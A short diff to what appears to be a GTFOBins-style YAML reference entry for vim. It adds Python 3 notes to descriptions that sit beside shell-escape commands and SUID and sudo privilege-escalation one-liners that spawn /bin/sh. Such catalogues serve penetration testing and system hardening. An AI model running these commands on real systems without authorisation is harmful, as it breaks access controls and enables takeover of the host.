@@ -6,7 +6,7 @@ functions:
         vim
         :set shell=/bin/sh
         :shell
-    - description: This requires that `vim` is compiled with Python support.
+    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
       code: vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
   file-write:
     - code: |
@@ -18,10 +18,10 @@ functions:
     - code: vim file_to_read
   suid:
     - code: ./vim -c ':!/bin/sh -p'
-    - description: This requires that `vim` is compiled with Python support.
+    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
       code: ./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
   sudo:
     - code: sudo vim -c ':!/bin/sh'
-    - description: This requires that `vim` is compiled with Python support.
+    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
       code: sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 ---
